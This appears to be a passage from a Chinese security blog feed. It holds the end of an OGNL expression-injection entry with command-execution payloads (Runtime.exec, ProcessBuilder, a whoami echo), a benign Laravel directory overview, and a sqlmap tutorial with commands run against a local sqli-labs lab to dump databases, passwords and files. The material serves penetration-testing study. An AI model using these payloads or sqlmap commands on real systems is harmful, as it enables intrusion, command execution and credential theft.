<h3 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取context里面的变量值</span><br><span class="line"> #user</span><br><span class="line"> #user.name</span><br><span class="line"></span><br><span class="line">//使用runtime执行系统命令</span><br><span class="line">@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)</span><br><span class="line"></span><br><span class="line">//使用processbuilder执行系统命令</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;calc&quot;&#125;)).start()</span><br><span class="line"></span><br><span class="line">//获取当前绝对路径</span><br><span class="line">@java.lang.System@getProperty(&quot;user.dir&quot;)</span><br><span class="line"></span><br><span class="line">// e-mobole带回显</span><br><span class="line">@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>java表达式</category>
      </categories>
      <tags>
        <tag>-OGNL -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h1 id="PHP框架指纹识别"><a href="#PHP框架指纹识别" class="headerlink" title="PHP框架指纹识别"></a>PHP框架指纹识别</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p>Laravel 应用默认的目录结构试图为不管是大型应用还是小型应用提供一个好的起点，当然，你可以自己按照喜好重新组织应用目录结构，Laravel 对类在何处被加载没有任何限制——只要 Composer 可以自动载入它们即可。</p>
<p><strong>Models****目录在哪里？</strong></p>
<p>许多初学者都会困惑Laravel为什么没有<code>models</code>目录，我可以负责任的告诉大家，这是故意的。因为<code>models</code>这个词对不同人而言有不同的含义，容易造成歧义，有些开发者认为应用的模型指的是业务逻辑，另外一些人则认为模型指的是与关联数据库的交互。</p>
<p>正是因为这个原因，我们默认将Eloquent的模型直接放置到<code>app</code>目录下，从而允许开发者自行选择放置的位置。</p>
<h2 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a><strong>根目录</strong></h2><h3 id="App目录"><a href="#App目录" class="headerlink" title="App目录"></a><strong>App目录</strong></h3><p><code>app</code>目录包含了应用的核心代码，此外你为应用编写的代码绝大多数也会放到这里；</p>
<h3 id="Bootstrap目录"><a href="#Bootstrap目录" class="headerlink" title="Bootstrap目录"></a><strong>Bootstrap目录</strong></h3><p><code>bootstrap</code>目录包含了少许文件，用于框架的启动和自动载入配置，还有一个<code>cache</code>文件夹用于包含框架为提升性能所生成的文件，如路由和服务缓存文件；</p>
<h3 id="Config目录"><a href="#Config目录" class="headerlink" title="Config目录"></a><strong>Config目录</strong></h3><p><code>config</code>目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉所有配置项；</p>
<h3 id="Database目录"><a href="#Database目录" class="headerlink" title="Database目录"></a><strong>Database目录</strong></h3><p><code>database</code>目录包含了数据迁移及填充文件，如果你喜欢的话还可以将其作为 SQLite 数据库存放目录；</p>
<h3 id="Public目录"><a href="#Public目录" class="headerlink" title="Public目录"></a><strong>Public目录</strong></h3><p><code>public</code>目录包含了入口文件<code>index.php</code>和前端资源文件（图片、JavaScript、CSS等）；</p>
<h3 id="Resources目录"><a href="#Resources目录" class="headerlink" title="Resources目录"></a><strong>Resources目录</strong></h3><p><code>resources</code>目录包含了视图文件及原生资源文件（LESS、SASS、CoffeeScript），以及本地化文件；</p>
<h3 id="Routes目录"><a href="#Routes目录" class="headerlink" title="Routes目录"></a><strong>Routes目录</strong></h3><p><code>routes</code> 目录包含了应用的所有路由定义。Laravel默认提供了三个路由文件：<code>web.php</code>、<code>api.php</code>和<code>console.php</code>。</p>
<p><code>web.php</code>文件包含的路由都会应用web中间件组，具备Session、CSRF防护以及Cookie加密功能，如果应用无需提供无状态的、RESTful风格的API，所有路由都会定义在<code>web.php</code>文件。</p>
<p><code>api.php</code> 文件包含的路由应用了<code>api</code>中间件组，具备频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过token进行认证并且不能访问Session状态。</p>
<p><code>console.php</code> 文件用于定义所有基于闭包的控制台命令，每个闭包都被绑定到一个控制台命令并且允许与命令行IO方法进行交互，尽管这个文件并不定义HTTP路由，但是它定义了基于控制台的应用入口（路由）。</p>
<h3 id="Storage目录"><a href="#Storage目录" class="headerlink" title="Storage目录"></a><strong>Storage目录</strong></h3><p><code>storage</code>目录包含了编译过的Blade模板、基于文件的session、文件缓存，以及其它由框架生成的文件，该目录被细分为成<code>app</code>、<code>framework</code>和<code>logs</code>子母录，<code>app</code>目录用于存放应用要使用的文件，<code>framework</code>目录用于存放框架生成的文件和缓存，最后，<code>logs</code>目录包含应用的日志文件；</p>
<p><code>storage/app/public</code> 目录用于存储用户生成的文件，比如可以被公开访问的用户头像，要达到被访问的目的，你还需要在<code>public</code>目录下生成一个软连接 <code>storage</code> 指向这个目录。你可以通过 <code>php artisan storage:link</code> 命令生成这个软链接。</p>
<h3 id="Tests目录"><a href="#Tests目录" class="headerlink" title="Tests目录"></a><strong>Tests目录</strong></h3><p><code>tests</code>目录包含自动化测试，其中已经提供了一个开箱即用的<a href="https://phpunit.de/">PHPUnit</a>示例；每一个测试类都要以 Test 开头，你可以通过 <code>phpunit</code> 或 <code>php vendor/bin/phpunit</code> 命令来运行测试。</p>
<h3 id="Vendor目录"><a href="#Vendor目录" class="headerlink" title="Vendor目录"></a><strong>Vendor目录</strong></h3><p><code>vendor</code>目录包含<a href="https://getcomposer.org/">Composer</a>依赖。</p>
<h2 id="App目录-1"><a href="#App目录-1" class="headerlink" title="App目录"></a><strong>App目录</strong></h2><p>应用的核心代码位于<code>app</code>目录下，默认情况下，该目录位于命名空间 App 下，  并且被 Composer 通过 <a href="http://www.php-fig.org/psr/psr-4/">PSR-4自动载入标准</a> 自动加载。</p>
<p><code>app</code>目录下包含多个子目录，如<code>Console</code>、<code>Http</code>、<code>Providers</code>等。<code>Console</code>和<code>Http</code>目录提供了进入应用核心的API，HTTP协议和CLI是和应用进行交互的两种机制，但实际上并不包含应用逻辑。换句话说，它们只是两个向应用发布命令的方式。<code>Console</code>目录包含了所有的Artisan命令，<code>Http</code>目录包含了控制器、中间件和请求等。</p>
<p>其他目录将会在你通过Artisan命令make生成相应类的时候生成到<code>app</code>目录下。例如，<code>app/Jobs</code>目录直到你执行 <code>make:job</code> 命令生成任务类时才会出现在<code>app</code>目录下。</p>
<blockquote>
<p>注意：<code>app</code>目录中的很多类都可以通过Artisan命令生成，要查看所有有效的命令，可以在终端中运行<code>php artisan list make</code>命令。</p>
</blockquote>
<h3 id="Console目录"><a href="#Console目录" class="headerlink" title="Console目录"></a><strong>Console目录</strong></h3><p><code>Console</code>目录包含应用所有自定义的Artisan命令，这些命令类可以使用<code>make:command</code>命令生成。该目录下还有console核心类，在这里可以注册自定义的Artisan命令以及定义调度任务。</p>
<h3 id="Events目录"><a href="#Events目录" class="headerlink" title="Events目录"></a><strong>Events目录</strong></h3><p>这个目录默认不存在，但是可以通过 <code>event:generate</code> 和 <code>make:event</code> 命令创建。该目录用于存放事件类。事件类用于告知应用其他部分某个事件发生并提供灵活的、解耦的处理机制。</p>
<h3 id="Exceptions目录"><a href="#Exceptions目录" class="headerlink" title="Exceptions目录"></a><strong>Exceptions目录</strong></h3><p><code>Exceptions</code>目录包含应用的异常处理器，同时还是处理应用抛出的任何异常的好地方。如果你想要自定义异常如何记录异常或渲染，需要修改 Handler 类。</p>
<h3 id="Http目录"><a href="#Http目录" class="headerlink" title="Http目录"></a><strong>Http目录</strong></h3><p><code>Http</code> 目录包含了控制器、中间件以及表单请求等，几乎所有进入应用的请求处理都在这里进行。</p>
<h3 id="Jobs目录"><a href="#Jobs目录" class="headerlink" title="Jobs目录"></a><strong>Jobs目录</strong></h3><p>该目录默认不存在，可以通过执行 <code>make:job</code> 命令生成，<code>Jobs</code>目录用于存放队列任务，应用中的任务可以被队列化，也可以在当前请求生命周期内同步执行。同步执行的任务有时也被看作命令，因为它们实现了命令模式。</p>
<h3 id="Listeners目录"><a href="#Listeners目录" class="headerlink" title="Listeners目录"></a><strong>Listeners目录</strong></h3><p>这个目录默认不存在，可以通过执行 <code>event:generate</code> 和 <code>make:listener</code> 命令创建。<code>Listeners</code>目录包含处理事件的类（事件监听器），事件监听器接收一个事件并提供对该事件发生后的响应逻辑，例如，<code>UserRegistered</code>事件可以被<code>SendWelcomeEmail</code>监听器处理。</p>
<h3 id="Mail目录"><a href="#Mail目录" class="headerlink" title="Mail目录"></a><strong>Mail目录</strong></h3><p>这个目录默认不存在，但是可以通过执行 <code>make:mail</code> 命令生成，<code>Mail</code>目录包含邮件发送类，邮件对象允许你在一个地方封装构建邮件所需的所有业务逻辑，然后使用 <code>Mail::send</code> 方法发送邮件。</p>
<h3 id="Notifications目录"><a href="#Notifications目录" class="headerlink" title="Notifications目录"></a><strong>Notifications目录</strong></h3><p>这个目录默认不存在，你可以通过执行 <code>make:notification</code> 命令创建， <code>Notifications</code> 目录包含应用发送的所有通知，比如事件发生通知。Laravel的通知功能将通知发送和通知驱动解耦，你可以通过邮件，也可以通过Slack、短信或者数据库发送通知。</p>
<h3 id="Policies目录"><a href="#Policies目录" class="headerlink" title="Policies目录"></a><strong>Policies目录</strong></h3><p>这个目录默认不存在，你可以通过执行 <code>make:policy</code> 命令来创建， <code>Policies</code> 目录包含了所有的授权策略类，策略用于判断某个用户是否有权限去访问指定资源。更多详情，请查看授权文档。</p>
<h3 id="Providers目录"><a href="#Providers目录" class="headerlink" title="Providers目录"></a><strong>Providers目录</strong></h3><p><code>Providers</code> 目录包含应用的所有服务提供者。服务提供者在启动应用过程中绑定服务到容器、注册事件以及执行其他任务以为即将到来的请求处理做准备。</p>
<p>在新安装的Laravel应用中，该目录已经包含了一些服务提供者，你可以按需添加自己的服务提供者到该目录。</p>
]]></content>
  </entry>
  <entry>
    <title>SQLMAP用法</title>
    <url>/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="SQLMAP用法"><a href="#SQLMAP用法" class="headerlink" title="SQLMAP用法"></a>SQLMAP用法</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap是一款基于python编写的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>工具，在sql检测和利用方面功能强大，支持多种数据库</p>
<h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                         显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">​                                          0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">​                                          1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">​                                          2：显示debug消息</span><br><span class="line"></span><br><span class="line">​                                          3：显示注入payload</span><br><span class="line"></span><br><span class="line">​                                          4：显示http请求</span><br><span class="line"></span><br><span class="line">​                                          5：显示http响应头·</span><br><span class="line"></span><br><span class="line">​                                          6：显示http响应内容</span><br></pre></td></tr></table></figure>

<h3 id="Target："><a href="#Target：" class="headerlink" title="Target："></a>Target：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br></pre></td></tr></table></figure>

<h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                            POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure>

<p>​           </p>
<h3 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br></pre></td></tr></table></figure>



<h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br></pre></td></tr></table></figure>



<h3 id="Detectiong"><a href="#Detectiong" class="headerlink" title="Detectiong"></a>Detectiong</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br></pre></td></tr></table></figure>



<h3 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br></pre></td></tr></table></figure>



<h3 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br></pre></td></tr></table></figure>



<h3 id="Emuneration"><a href="#Emuneration" class="headerlink" title="Emuneration"></a>Emuneration</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br></pre></td></tr></table></figure>



<h3 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br></pre></td></tr></table></figure>



<h3 id="File-system-access"><a href="#File-system-access" class="headerlink" title="File system access"></a>File system access</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br></pre></td></tr></table></figure>



<h3 id="General"><a href="#General" class="headerlink" title="General"></a>General</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br></pre></td></tr></table></figure>



<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>–technique&#x3D;     （默认全部使用）</p>
<p>B       基于布尔的盲注</p>
<p>T       基于时间的盲注</p>
<p>E      基于报错的注入</p>
<p>U      基于UNION查询注入</p>
<p>S      基于多语句查询注入</p>
<h3 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h3><p><strong>1.指定目标url</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>2.从文件中获取多个url</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>

<p><strong>3.从文件中加载HTTP请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>

<p><strong>4.利用google获取目标</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>5.从burp日志中获取目标</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>



<h3 id="实例演示-注入检测"><a href="#实例演示-注入检测" class="headerlink" title="实例演示-注入检测"></a>实例演示-注入检测</h3><p><strong>1.GET参数注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>2.POST参数注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 2</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定cookie，这样就可以检测cookie。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183719226.png" class title="image-20220221183719226">

<p><strong>4.user-agent注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183751119.png" class title="image-20220221183751119">





<p><strong>5.referer注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定referer，这样就可以检测referer。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183847549.png" class title="image-20220221183847549">



<p><strong>6.host注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 5</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定host，这样就可以检测host。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184003961.png" class title="image-20220221184003961">



<h3 id="实例演示-获取数据库信息"><a href="#实例演示-获取数据库信息" class="headerlink" title="实例演示-获取数据库信息"></a>实例演示-获取数据库信息</h3><p><strong>1.查看数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184417117.png" class title="image-20220221184417117">



<p><strong>2.查看数据库里面的表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --tables --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184338043.png" class title="image-20220221184338043">



<p><strong>3.查看数据库表里面的列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --T users --columns   --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184320282.png" class title="image-20220221184320282">



<p><strong>4.查看数据库列里面的具体的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --T users -C password     --dump  --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184302447.png" class title="image-20220221184302447">



<h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p>使用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.MySQL数据库版本小于5.0，没有information——schema表。</span><br><span class="line"></span><br><span class="line">2.Microssoft Access数据库。</span><br><span class="line"></span><br><span class="line">3.当前用户没有权限读取系统中保存的数据。</span><br></pre></td></tr></table></figure>

<p><strong>暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</strong></p>
<p><strong>1.暴力破解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security --common-tables --batch</span><br></pre></td></tr></table></figure>



<p><strong>2.暴力破解列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security -T users --common-columns --batch</span><br></pre></td></tr></table></figure>



<h3 id="实例演示-读取文件-x2F-上传文件"><a href="#实例演示-读取文件-x2F-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-read &quot;C:/post.txt&quot;</span><br></pre></td></tr></table></figure>



<p><strong>2.写入文件</strong></p>
